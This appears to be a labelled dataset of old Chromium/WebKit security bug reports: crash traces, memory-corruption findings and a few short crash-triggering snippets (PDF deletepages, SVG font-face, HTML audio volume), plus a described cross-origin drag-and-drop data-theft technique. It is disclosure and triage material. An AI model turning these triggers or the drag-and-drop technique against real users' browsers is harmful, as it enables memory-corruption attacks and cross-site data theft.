184 002ed56c 41400000 002ed594 chrome_68390000 call_new_handler bool nothrow true c b\slave\chrome-official\build\src\base\allocator\allocator_shim.cc 75 82800014 68a6b1fb 82800014 chrome_68390000 malloc unsigned int size c b\slave\chrome-official\build\src\base\allocator\allocator_shim.cc 120 82800014 68a6b24a 002ed568 chrome_68390000 wtf fastmalloc unsigned int n c b\slave\chrome-official\build\src\third_party\webkit\javascriptcore\wtf\fastmalloc.cpp 250 002ed568 002ed600 01718218 chrome_68390000 wtf stringimpl createuninitialized unsigned int length wchar_t data c b\slave\chrome-official\build\src\third_party\webkit\javascriptcore\wtf\text\stringimpl.cpp 87 002ed594 80000000 01718618 chrome_68390000 wtf stringimpl create wchar_t characters memory read error at address unsigned int length c b\slave\chrome-official\build\src\third_party\webkit\javascriptcore\wtf\text\stringimpl.cpp 99 80000000 41400000 00000454 chrome_68390000 wtf string string wchar_t characters memory read error at address unsigned int length c b\slave\chrome-official\build\src\third_party\webkit\javascriptcore\wtf\text\wtfstring.cpp 42 002eed5c 002eed5c 00000000 chrome_68390000 webcore cssparser parsefontfacesrc void c b\slave\chrome-official\build\src\third_party\webkit\webcore\css\cssparser.cpp 3633 00000454 00000000 00000000 chrome_68390000 webcore cssparser parsevalue int propid 0n1108 bool important false c b\slave\chrome-official\build\src\third_party\webkit\webcore\css\cssparser.cpp 1180 002eed5c 00ae6180 002eed5c chrome_68390000 cssyyparse void parser c b\slave\chrome-official\build\src\third_party\webkit\webcore\css\cssgrammar.y 1422 002eed5c 00ae6180 00afba2c chrome_68390000 webcore cssparser parsedeclaration class webcore cssmutablestyledeclaration declaration class wtf string string class wtf refptr webcore cssstylesourcedata stylesourcedata c b\slave\chrome-official\build\src\third_party\webkit\webcore\css\cssparser.cpp 351 00afba2c 01719c80 00afba20 chrome_68390000 webcore cssmutablestyledeclaration parsedeclaration class wtf string styledeclaration c b\slave\chrome-official\build\src\third_party\webkit\webcore\css\cssmutablestyledeclaration.cpp 595 00afba20 01719c80 00afba20 chrome_68390000 webcore styledelement parsemappedattribute class webcore attribute attr c b\slave\chrome-official\build\src\third_party\webkit\webcore\dom\styledelement.cpp 252 00afba20 00acfb80 00acfb84 chrome_68390000 webcore htmlelement parsemappedattribute class webcore attribute attr c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\htmlelement.cpp 257 01afba20 00000000 002eef34 chrome_68390000 webcore styledelement attributechanged class webcore attribute attr bool preservedecls false c b\slave\chrome-official\build\src\third_party\webkit\webcore\dom\styledelement.cpp 187 01719c80 00000000 00000000 chrome_68390000 webcore element setattributemap class wtf passrefptr webcore namednodemap list class wtf passrefptr webcore namednodemap webcore fragmentscriptingpermission scriptingpermission fragmentscriptingallowed 0n0 c b\slave\chrome-official\build\src\third_party\webkit\webcore\dom\element.cpp 733 00aae840 002eef40 002ef024 chrome_68390000 webcore htmlconstructionsite createhtmlelement class webcore atomichtmltoken token c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\parser\htmlconstructionsite.cpp 346 002ef024 002ef024 01718280 chrome_68390000 webcore htmlconstructionsite inserthtmlelement class webcore atomichtmltoken token c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\parser\htmlconstructionsite.cpp 267 01718280 002ef024 00000000 chrome_68390000 webcore htmltreebuilder processstarttagforinbody class webcore atomichtmltoken token c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\parser\htmltreebuilder.cpp 773 002ef024 00b1a054 01718280 chrome_68390000 webcore htmltreebuilder processstarttag class webcore atomichtmltoken token c b\slave\chrome-official\build\src\third_party\webkit\webcore\html\parser\htmltreebuilder.cpp 1202	7
crash in ballonviewimpl delayedclose thread 0 crashed exception_breakpoint chrome.dll chrome_dll_main.cc:163 anonymous namespace purecall chrome.dll purevirt.c:47 purecall chrome.dll balloon_view.cc:154 balloonviewimpl delayedclose bool chrome.dll task.h:158 scopedrunnablemethodfactory balloonviewimpl runnablemethod void balloonviewimpl bool tuple1 bool run chrome.dll message_loop.cc:410 messageloop runtask task chrome.dll message_loop.cc:419 messageloop deferorrunpendingtask messageloop pendingtask const chrome.dll message_loop.cc:526 messageloop dowork chrome.dll message_pump_win.cc:202 base messagepumpforui dorunloop chrome.dll message_pump_win.cc:51 base messagepumpwin runwithdispatcher base messagepump delegate base messagepumpwin dispatcher chrome.dll message_loop.cc:253 messageloop runinternal chrome.dll message_loop.cc:230 messageloop runhandler chrome.dll message_loop.cc:656 messageloopforui run base messagepumpwin dispatcher chrome.dll browser_main.cc:469 anonymous namespace runuimessageloop browserprocess chrome.dll browser_main.cc:1447 browsermain mainfunctionparams const chrome.dll chrome_dll_main.cc:947 chromemain chrome.exe client_util.cc:247 maindllloader launch hinstance sandbox sandboxinterfaceinfo chrome.exe chrome_exe_main.cc:46 wwinmain	9
crashes at wild eip when pressing print button on pdfs couple of examples 1 crashed exception_access_violation_exec 2 crash does n't look serious but often fires a worse manifestation in the debugger i ll have a look right away	9
csscursorimagevalue not clearing svgelement back pointer chrome version 8.0.552.224 urls if applicable other browsers tested ff4.0b7 add ok or fail after other browsers where you have tested this issue safari 5 firefox 3.x ok ie 7/8 n/a what steps will reproduce the problem 1 open url 2 press the mouse button on green wheel 3 move the mouse rotate the wheel 4 release the mouse button 5 pres the mouse button again what is the expected result rotating the wheel again what happens instead crash please provide any additional information below attach a screenshot if possible it seems to be regression as i encounter this problem after update from the previous version 8.0.552.215	9
crash in pdf form event handling when deleting page from underneath self reproduction case go to type this into the text box this.deletepages 0,0 press the button this will crash trying to execute code at a random piece of memory due to a use-after-free it is easy to fix by disabling deletepages for now which no-one seems to use	11
vu 821271 exception generated by code running in the stack vulnerability details exploitable exception generated by code running in the stack starting at unknown symbol called from pdf getpdfdocinfo hash version chrome version 8.0.552.224 stable operating system win xp pro sp3 reproduction case the crash does n't trigger every time so give it a few runs the access violation appears to be handled so it only crashes with a debugger attached below is the cdb syntax i used c cdb amsec.dll hd xd gp xd bpe o g c exploitable v q c documents and settings\administrator\local settings\application data\google\chrome\application\chrome.exe c fuzzed_crasher.pdf for crashes please include the following additional information type of crash browser crash state see attached exploitable output	11
renderer crash when playing a corrupt webm video vulnerability details opening the attached webm video causes a renderer crash in chrome the crash happens at memcpy in linux crash addresses are pretty high and move with the stack pointer when reloading the page i ll try to minimize the triggering video and have a look at what is the cause of the bug later before that is this the right place to report media-related possible security issues in chrome or should they be filed upstream to ffmpeg or elsewhere in other players mplayer 1.0rc4-4.4.5 c 2000-2010 mplayer team no crash vlc version 1.1.4 the luggage exported segmentation fault also in memcpy with last words failed to decode frame corrupt frame detected additional information truncated packet or corrupt partition 0 length failed to decode frame bitstream not supported by this decoder additional information invalid frame sync code version chrome version 9.0.597.19 official build 68937 beta operating system ubuntu 10.10 x86_64 reproduction case google-chrome memcpy.webm for crashes please include the following additional information type of crash tab crash state program received signal sigsegv segmentation fault switching to thread lwp 29521 memcpy at sysdeps/x86_64/memcpy.s:191 191 sysdeps/x86_64/memcpy.s no such file or directory in sysdeps/x86_64/memcpy.s gdb bt 8 0 memcpy at sysdeps/x86_64/memcpy.s:191 1 in media copyplane plane value optimized out video_frame value optimized out frame value optimized out at usr/include/bits/string3.h:52 2 in media ffmpegvideodecodeengine decodeframe this buffer value optimized out at media/video/ffmpeg_video_decode_engine.cc:283 3 in media ffmpegvideodecodeengine consumevideosample this buffer value optimized out at media/video/ffmpeg_video_decode_engine.cc:162 4 in media ffmpegvideodecoder onreadcompletetask this value optimized out buffer value optimized out at media/filters/ffmpeg_video_decoder.cc:287 5 in dispatchtomethod media ffmpegvideodecoder void media ffmpegvideodecoder scoped_refptr media buffer scoped_refptr media buffer this value optimized out at base/tuple.h:554 6 runnablemethod media ffmpegvideodecoder void media ffmpegvideodecoder scoped_refptr media buffer tuple1 scoped_refptr media buffer run this value optimized out at base/task.h:330 7 in messageloop runtask this task at base/message_loop.cc:410 more stack frames follow gdb disas rip-22 rip+16 dump of assembler code from to memcpy+188 nop memcpy+189 nop memcpy+190 nop memcpy+191 nop memcpy+192 cmp rdx memcpy+199 ja memcpy+320 memcpy+201 mov edx ecx memcpy+203 shr ecx memcpy+206 je memcpy+304 memcpy+208 dec ecx memcpy+210 mov rsi rax memcpy+213 mov rsi r8 memcpy+217 mov rsi r9 memcpy+221 mov rsi r10 memcpy+225 mov rax rdi end of assembler dump gdb info registers rax 0 rbx 140737374145792 rcx 11 rdx 640 rsi 140737399148544 rdi 140737374145408 rbp rsp r8 0 r9 0 r10 0 r11 1 r12 4274 r13 4456 r14 640 r15 640 rip memcpy+210 eflags if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0	9
external-report svgelementinstance m_useelement not cleared on corresponding use element destruction reported anonymously along with an assertion of exploitability vulnerability details run the attached test case with single-process js-flags expose_gc version chrome version trunk m8 m9 operating system ubuntu 10.04 64-bit reproduction case see attached for crashes please include the following additional information assert m_deletionhasbegun 0 in webcore treeshared webcore containernode ref this at third_party/webkit/webcore/platform/treeshared.h:61 1 in webcore v8svguseelement wrapslow impl at out/debug/obj/gen/webcore/bindings/v8svguseelement.cpp:371 2 in webcore v8svguseelement wrap impl forcenewobject=false at out/debug/obj/gen/webkit/bindings/v8svguseelement.h:62 3 in webcore tov8 impl forcenewobject=false at out/debug/obj/gen/webkit/bindings/v8svguseelement.h:69 4 in correspondinguseelementattrgetter name info at out/debug/obj/gen/webcore/bindings/v8svgelementinstance.cpp:63 5 in v8 internal object getpropertywithcallback this receiver structure name holder at v8/src/objects.cc:184 6 in v8 internal object getproperty this receiver result name attributes at v8/src/objects.cc:521 7 in v8 internal loadic load this state=v8 internal uninitialized object name at v8/src/ic.cc:915 8 in v8 internal loadic_miss args	9
freeing invalid uninitialized pointer to bug_report object test chrome 10.0.612.1 dev windows xp sp3 1 goto chrome bugreport 2 refresh it or close the tab see crash	9
memory corruption with bad vorbis streams from cert vulnerability details cert sent us a large number of webm files that cause trouble crash etc chrome the worst of the problem seems to be a couple of memory corruptions in the ffmpeg vorbis codec this bug will track the problems in the vorbis codec additional bugs will be filed for any remaining issues version chrome version all including trunk m8 stable m9 beta etc operating system all i can reproduce various crashes on linux reproduction case attaching two test cases for the two different fixes i have that apply to the vorbis code out.webm.68798.1929 memory corruption rendering the channel floor buffer out.webm.139771.2965 memory corruption rendering the channel residue buffer	11
invalid free in bundled pdf viewer vulnerability details opening the attached pdf document causes tcmalloc to abort when trying to free an invalid pointer changing the content of the pdf document can be used to change the freed address sounds like the data in the document can be used to corrupt objects in memory so reporting this as a potential security issue version chrome version 8.0.552.224 official build 68599 10.0.612.1 official build 69289 dev operating system linux 64-bit ubuntu 10.10 reproduction case attached for crashes please include the following additional information type of crash tab abort not crash crash state stderr shows third_party/tcmalloc/chromium/src/tcmalloc.cc:406 attempt to free invalid pointer backtrace is rather useless without debugging symbols program received signal sigabrt aborted in raise sig value optimized out at nptl/sysdeps/unix/sysv/linux/raise.c:64 64 nptl/sysdeps/unix/sysv/linux/raise.c no such file or directory in nptl/sysdeps/unix/sysv/linux/raise.c gdb bt 10 0 in raise sig value optimized out at nptl/sysdeps/unix/sysv/linux/raise.c:64 1 in abort at abort.c:92 2 in 3 in 4 in 5 in from opt/google/chrome/libpdf.so 6 in from opt/google/chrome/libpdf.so 7 in from opt/google/chrome/libpdf.so 8 in from opt/google/chrome/libpdf.so 9 in from opt/google/chrome/libpdf.so more stack frames follow	11
destroying nextblock in renderblock removechild can cause oldchild and nextblock s next sibling to be merged vulnerability details two separate html files have been attached which each trigger a jump to null in the 8.0.552.224 ubuntu 10.10 release of chromium in each case a small number of dom nodes are created appended to a document and removed when removing certain nodes a jump to null is triggered in each of the two cases common among the two proof of concept files are a span with a display property of run-in and a different span with a display property of list-item version chrome version 8.0.552.224 ubuntu 10.10 stable operating system ubuntu 10.10 reproduction case i have attached two files 0.html and 1.html which trigger crashes in slightly different portions of the code though i suspect that they have the same root cause in both cases i was unable to reproduce the crash if additional elements were removed but common in both cases were an element with a display type of run-in and a separate element with display type of list-item this may not be the root cause of the issue since in each case more is going on but it seemed to be a strange coincidence i have also tired to narrow the proof of concept files down further when pruning additional moves and elements the crash either did not occur or was significantly less reliable for crashes please include the following additional information type of crash tab below are slightly truncated versions of the traces through the programs with gdb and valgrind using the development branch of chromium 10.0.626.0 the full traces have been included as attachments for the file 0.html chromium-browser debug single-process 0.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.dlq3kq gnu gdb gdb 7.2-ubuntu program received signal sigsegv segmentation fault switching to thread lwp 2039 in gdb bt 0 in 1 in markcontainingblocksforlayout this owner oldchild fullremove=true at third_party/webkit/webcore/rendering/renderobject.h:946 2 setneedslayout this owner oldchild fullremove=true at third_party/webkit/webcore/rendering/renderobject.h:884 3 setneedslayoutandprefwidthsrecalc this owner oldchild fullremove=true at third_party/webkit/webcore/rendering/renderobject.h:466 4 webcore renderobjectchildlist removechildnode this owner oldchild fullremove=true at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:70 5 in webcore renderobject removechild this oldchild at third_party/webkit/webcore/rendering/renderobject.cpp:340 6 in webcore renderblock removechild this oldchild at third_party/webkit/webcore/rendering/renderblock.cpp:996 7 in remove this at third_party/webkit/webcore/rendering/renderobject.h:727 8 webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2178 9 in webcore renderboxmodelobject destroy this type return to continue or q return to quit gdb frame 1 1 in markcontainingblocksforlayout this owner oldchild fullremove=true at third_party/webkit/webcore/rendering/renderobject.h:946 946 third_party/webkit/webcore/rendering/renderobject.h no such file or directory in third_party/webkit/webcore/rendering/renderobject.h gdb disassemble pc-16 pc+16 dump of assembler code from to webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1083 decl ebp webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1089 push es webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1090 mov esi esp webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1093 call eax webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1099 test al al webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1101 jne webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 669 webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1107 mov ebp edi webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1110 mov ebp esi webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1113 jmp webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 840 type return to continue or q return to quit end of assembler dump gdb i r eax 48403528 ecx 48402704 edx 53018048 ebx 47320340 esp ebp esi 48404044 edi 0 eip webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool 1099 eflags pf zf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 4810 thread 13 4810 conditional jump or move depends on uninitialised value s 4810 at v8 internal stacktracer trace v8 internal ticksample log.cc:167 4810 by v8 internal ticker dosamplestack v8 internal ticksample log.cc:237 4810 by v8 internal sampler samplestack v8 internal ticksample platform.h:575 4810 by v8 internal profilersignalhandler int siginfo void platform-linux.cc:809 4810 by in lib/libpthread-2.12.1.so 4810 by tcmalloc pageheap decommitspan tcmalloc span page_heap.cc:160 4810 by tcmalloc pageheap mergeintofreelist tcmalloc span page_heap.cc:286 4810 by tcmalloc pageheap delete tcmalloc span page_heap.cc:216 4810 by anonymous namespace do_free_with_callback void void void tcmalloc.cc:1056 4810 by anonymous namespace do_free void tcmalloc.cc:1062 4810 by free in home/marty/documents/security_research/tests/chromium/home/chrome-svn/tarball/chromium/src/out/debug/chrome 4810 by v8 internal malloced delete void allocation.cc:50 4810 4810 invalid read of size 4 4810 at webcore renderobject markcontainingblocksforlayout bool webcore renderobject renderobject.h:959 4810 by webcore renderobject setneedslayout bool bool renderobject.h:897 4810 by webcore renderobject setneedslayoutandprefwidthsrecalc renderobject.h:470 4810 by webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool renderobjectchildlist.cpp:70 4810 by webcore renderobject removechild webcore renderobject renderobject.cpp:339 4810 by webcore renderblock removechild webcore renderobject renderblock.cpp:999 4810 by webcore renderobject remove renderobject.h:727 4810 by webcore renderobject destroy renderobject.cpp:2185 4810 by webcore renderboxmodelobject destroy renderboxmodelobject.cpp:246 4810 by webcore renderinline destroy renderinline.cpp:93 4810 by webcore node detach node.cpp:1256 4810 by webcore containernode detach containernode.cpp:724 4810 address is not stack d malloc d or recently free d 4810 4810 4810 process terminating with default action of signal 11 sigsegv 4810 access not within mapped region at address 4810 at webcore renderobject markcontainingblocksforlayout bool webcore renderobject renderobject.h:959 4810 by webcore renderobject setneedslayout bool bool renderobject.h:897 4810 by webcore renderobject setneedslayoutandprefwidthsrecalc renderobject.h:470 4810 by webcore renderobjectchildlist removechildnode webcore renderobject webcore renderobject bool renderobjectchildlist.cpp:70 4810 by webcore renderobject removechild webcore renderobject renderobject.cpp:339 4810 by webcore renderblock removechild webcore renderobject renderblock.cpp:999 4810 by webcore renderobject remove renderobject.h:727 4810 by webcore renderobject destroy renderobject.cpp:2185 4810 by webcore renderboxmodelobject destroy renderboxmodelobject.cpp:246 4810 by webcore renderinline destroy renderinline.cpp:93 4810 by webcore node detach node.cpp:1256 4810 by webcore containernode detach containernode.cpp:724 4810 if you believe this happened as a result of a stack 4810 overflow in your program s main thread unlikely but 4810 possible you can try to increase the size of the 4810 main thread stack using the main-stacksize flag 4810 the main thread stack size used in this run was 8388608 for the file 1.html chromium-browser debug single-process 1.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.nxcksz gnu gdb gdb 7.2-ubuntu program received signal sigsegv segmentation fault switching to thread lwp 2100 in gdb bt 0 in 1 in webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2152 2 in webcore renderboxmodelobject destroy this at third_party/webkit/webcore/rendering/renderboxmodelobject.cpp:220 3 in webcore renderbox destroy this at third_party/webkit/webcore/rendering/renderbox.cpp:209 4 in webcore renderblock destroy this at third_party/webkit/webcore/rendering/renderblock.cpp:190 5 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:57 6 in webcore renderblock destroy this at third_party/webkit/webcore/rendering/renderblock.cpp:156 7 in webcore renderobjectchildlist destroyleftoverchildren this at third_party/webkit/webcore/rendering/renderobjectchildlist.cpp:57 8 in webcore renderblock destroy this at third_party/webkit/webcore/rendering/renderblock.cpp:156 9 in webcore renderinline destroy this at third_party/webkit/webcore/rendering/renderinline.cpp:65 10 in webcore renderobjectchildlist destroyleftoverchildren this type return to continue or q return to quit gdb frame 1 1 in webcore renderobject destroy this at third_party/webkit/webcore/rendering/renderobject.cpp:2152 2152 third_party/webkit/webcore/rendering/renderobject.cpp no such file or directory in third_party/webkit/webcore/rendering/renderobject.cpp gdb disassemble pc-16 pc+16 dump of assembler code from to webcore renderobject destroy 15 xchg eax ebx webcore renderobject destroy 16 incb ecx webcore renderobject destroy 22 add ecx ebx webcore renderobject destroy 28 call eax webcore renderobject destroy 31 test eax eax webcore renderobject destroy 33 je webcore renderobject destroy 43 webcore renderobject destroy 35 mov eax esp webcore renderobject destroy 38 call webcore renderobjectchildlist destroyleftoverchildren webcore renderobject destroy 43 mov esi eax webcore renderobject destroy 46 mov eax eax end of assembler dump gdb i r eax 48405816 ecx 51718336 edx 52042224 ebx 47320340 esp ebp esi 48405700 edi 0 eip webcore renderobject destroy 31 eflags pf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51 4858 thread 13 4858 conditional jump or move depends on uninitialised value s 4858 at v8 internal stacktracer trace v8 internal ticksample log.cc:167 4858 by v8 internal ticker dosamplestack v8 internal ticksample log.cc:237 4858 by v8 internal sampler samplestack v8 internal ticksample platform.h:575 4858 by v8 internal profilersignalhandler int siginfo void platform-linux.cc:809 4858 by in lib/libpthread-2.12.1.so 4858 by v8 internal object isdescriptorarray objects-inl.h:458 4858 by v8 internal descriptorarray cast v8 internal object objects-inl.h:1711 4858 by v8 internal heap empty_descriptor_array heap.h:771 4858 by v8 internal descriptorarray isempty objects-inl.h:1540 4858 by v8 internal descriptorarray number_of_descriptors objects.h:1938 4858 by v8 internal descriptorarray getkey int objects-inl.h:1581 4858 by v8 internal descriptorarray linearsearch v8 internal string int objects.cc:4144 4858 4858 conditional jump or move depends on uninitialised value s 4858 at checkhelper char const int char const bool checks.h:59 4858 by v8 internal heapobject cast v8 internal object objects-inl.h:1730 4858 by v8 internal stacktracer trace v8 internal ticksample log.cc:168 4858 by v8 internal ticker dosamplestack v8 internal ticksample log.cc:237 4858 by v8 internal sampler samplestack v8 internal ticksample platform.h:575 4858 by v8 internal profilersignalhandler int siginfo void platform-linux.cc:809 4858 by in lib/libpthread-2.12.1.so 4858 by v8 internal fixedarray fast_set v8 internal fixedarray int v8 internal object objects-inl.h:1480 4858 by v8 internal descriptorarray fast_swap v8 internal fixedarray int int objects-inl.h:1548 4858 by v8 internal descriptorarray swap int int objects-inl.h:1681 4858 by v8 internal descriptorarray sortunchecked objects.cc:4072 4858 by v8 internal descriptorarray sort objects.cc:4105 4858 4858 invalid read of size 4 4858 at webcore renderobject destroy renderobject.cpp:2159 4858 by webcore renderboxmodelobject destroy renderboxmodelobject.cpp:246 4858 by webcore renderbox destroy renderbox.cpp:209 4858 by webcore renderblock destroy renderblock.cpp:186 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderinline destroy renderinline.cpp:65 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:52 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 address is not stack d malloc d or recently free d 4858 4858 4858 process terminating with default action of signal 11 sigsegv 4858 access not within mapped region at address 4858 at webcore renderobject destroy renderobject.cpp:2159 4858 by webcore renderboxmodelobject destroy renderboxmodelobject.cpp:246 4858 by webcore renderbox destroy renderbox.cpp:209 4858 by webcore renderblock destroy renderblock.cpp:186 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderinline destroy renderinline.cpp:65 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:52 4858 by webcore renderblock destroy renderblock.cpp:151 4858 by webcore renderobjectchildlist destroyleftoverchildren renderobjectchildlist.cpp:57 4858 if you believe this happened as a result of a stack 4858 overflow in your program s main thread unlikely but 4858 possible you can try to increase the size of the 4858 main thread stack using the main-stacksize flag 4858 the main thread stack size used in this run was 8388608	9
mac sandbox allows calls to stat on arbitrary paths in the renderer set a breakpoint at webcore dragcontroller dragoperation step into containsurl asurl hasvalidurl and change the return value to false step until file_util pathexists is called on windows getfileattributes fails with error_access_denied on os x stat64 returns 0 i would expect it to fail uniformly in the sandbox or succeed uniformly	6
segmentation fault at webcore imageloader updatefromelement due to malformed html a html-document with the link a object type image/png data images/buttons/html401.p a three times causes a renderer segmentation fault in 6.0.472.55 official build 58392 beta and the corresponding chromium build running on ubuntu 10.04 i386 not tested with other versions the erroneous address had values 2f2f2f4e 2b5 1d and 21 during minimization eip and esp being mostly constant backtrace begins program received signal sigsegv segmentation fault in webcore imageloader updatefromelement this at third_party/webkit/webcore/loader/imageloader.cpp:189 189 third_party/webkit/webcore/loader/imageloader.cpp no such file or directory in third_party/webkit/webcore/loader/imageloader.cpp gdb bt 0 in webcore imageloader updatefromelement this at third_party/webkit/webcore/loader/imageloader.cpp:189 1 in webcore htmlobjectelement attach this at third_party/webkit/webcore/html/htmlobjectelement.cpp:156 2 in webcore containernode attach this at third_party/webkit/webcore/dom/containernode.cpp:638 3 in webcore element attach this at third_party/webkit/webcore/dom/element.cpp:816 4 in webcore containernode attach this at third_party/webkit/webcore/dom/containernode.cpp:638 5 in webcore element attach this at third_party/webkit/webcore/dom/element.cpp:816 6 in webcore htmlobjectelement attach this at third_party/webkit/webcore/html/htmlobjectelement.cpp:151 7 in webcore htmlobjectelement renderfallbackcontent this at third_party/webkit/webcore/html/htmlobjectelement.cpp:262 8 in webcore renderembeddedobject updatewidget this onlycreatenonnetscapeplugins=true at third_party/webkit/webcore/rendering/renderembeddedobject.cpp:308 9 in webcore htmlobjectelement updatewidget this at third_party/webkit/webcore/html/htmlobjectelement.cpp:164 10 in webcore htmlpluginelement updatewidgetcallback	11
security do not allow on-page drag-and-drop from non-same-origin frames or require an extra gesture this problem is making rounds on internal mailing lists for a while brought up by bj a while ago then by david bloom and i think it s time to do something about it there were real-world examples of such attacks against popular sites facebook to be precise and as outlined below mock scrollbars offer a particularly unobtrusive and likely vector for delivering this attack the problem is in essence that evil.com may include a hidden iframe pointing to example.com and have it track mouse movements for the attack to work it then needs to solicit the user to select the contents of that iframe to select text at least one-pixel movement of the mouse pointer while the left button is pressed would be required this enables selection mode and once this is done the attacker can reposition the iframe so that this action selects the entire text regardless of its actual length two simple and common ways to solicit this ui action would be 1 having the user interact with a specially crafted scrollbar e.g in a you-must-scroll-down-before-clicking-accept eula or in a partly visible article most users grab the slider drag it then release it 2 a casual game that involves drawing or a similar activity games also allow this to be exploited with triple-click once the text is selected the same single pixel drag-and-drop action needs to be solicited again e.g further scrolling the action needs to start over selected text and end over a receiving container at this point the content is copied over across domains without user s knowledge or consent i strongly believe this is not a sophisticated or unlikely attack scenario and that browser-side fixes are necessary a simple solution is to prevent cross-domain drag-and-drop on a single page altogether we can have dev channel experiments to see how many problems this causes but i suspect not many or to require a secondary gesture to approve dropping in such a case e.g hold shift to paste here tooltip note that in conjunction with view-source this can be used to steal raw html and in all cases works for non-html documents so javascript defenses such are not viable x-frame-options offer some defense but only to a subset of sites	2
crash loading invalid crx extension file vulnerability details there is a browser crash when loading a corrupt extension file version chrome version 7.0.517.44 stable operating system windows reproduction case 1 open the attached crx file 2 click continue when prompted 3 the browser crashes	9
google chrome crashes at chrome version 8.0.552.224 beta urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 ok firefox 3.x ok ie 7/8 ok windows what steps will reproduce the problem 1 go to 2 wait for crash 3 what is the expected result expect loading of ms exchange web interface upon authentication via smartcard what happens instead chrome crashes please provide any additional information below attach a screenshot if possible this crash occurs regardless of if there is a smartcard reader/smartcard present although if there is one present the crash occurs after being prompted for and choosing a certificate i have the cac-ng services installed from this site and am using os x 1.5.8	11
playing audio with volume set to undefined crashes browser chrome version 10.0.612.3 official build 69636 dev os version mac os x 10.6.5 build 10h574 other browsers tested safari 5 ok what steps will reproduce the problem doctype html html head title title head body script var audio document.createelement audio document.body.appendchild audio audio.src test.mp3 audio.volume undefined audio.play script body html what is the expected result audio should play with the volume set at 0 what happens instead browser crashes	11
playing z-type causes crash chrome version 8.0.552.215 developer build 0 urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 3.x ie 7/8 playing for 30-60 seconds causes a crash at least in linux according to the thread below windows 7 and mac at least do not have the same crash	11
webkit crashes during animation event processing credit rik cabanier and 1 me for noticing it siting for all its life and correlating with persistent crash reports while processing animation events webkit crashes in animationcontroller.cpp vector eventtodispatch const_iterator eventstodispatchend m_eventstodispatch.end for vector eventtodispatch const_iterator it m_eventstodispatch.begin it eventstodispatchend it if it eventtype eventnames webkittransitionendevent it element dispatchevent webkittransitionevent create it eventtype it name it elapsedtime else it element dispatchevent webkitanimationevent create it eventtype it name it elapsedtime crash we suspect that iterator was invalidated by one of the previous event dispatches	9
stale pointer in cssfontfacesource m_svgfontfaceelement vulnerability details opening html crashes tab version chrome version operating system windows xp 8.0.552.224 osx snow leopard 8.0.552.231 ubuntu 10.10 64-bit 8.0.552.224 ubuntu 10.10 64-bit chromium-browser 10.0.623.0~svn20101226r70187-0ubuntu1~ucd1~ma reproduction case svg g id b text font-family x f textpath text text font-family x f defs lineargradient id g animatetransform attributename gradienttransform lineargradient font font-face font-family x x font text font-family x xmlns xlink f x/0000 bbb a v 2 e gg f c ff r/0 p q n q m 2 t g use xlink href b use xlink href b for crashes please include the following additional information type of crash sad tab crash state gdb run starting program usr/lib/chromium-browser/chromium-browser single-process x.html program received signal sigsegv segmentation fault switching to thread lwp 25840 in webcore element getattribute this name at third_party/webkit/webcore/dom/element.cpp:230 230 in third_party/webkit/webcore/dom/element.cpp gdb i r rax 4294967297 rbx 140737372636736 rcx 140737372608624 rdx 140737371753472 rsi 140737359053912 rdi 140737372636736 rbp rsp r8 140737370698400 r9 524288 r10 0 r11 0 r12 140737372608624 r13 0 r14 0 r15 140737370698400 rip webcore element getattribute webcore qualifiedname const const+191 eflags pf zf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb bt 0 in webcore element getattribute this name at third_party/webkit/webcore/dom/element.cpp:230 1 in webcore svgfontfaceelement horizontaloriginx this value optimized out at third_party/webkit/webcore/svg/svgfontfaceelement.cpp:146 2 in webcore svgfontdata svgfontdata this fontfaceelement at third_party/webkit/webcore/svg/svgfontdata.cpp:34 3 in webcore 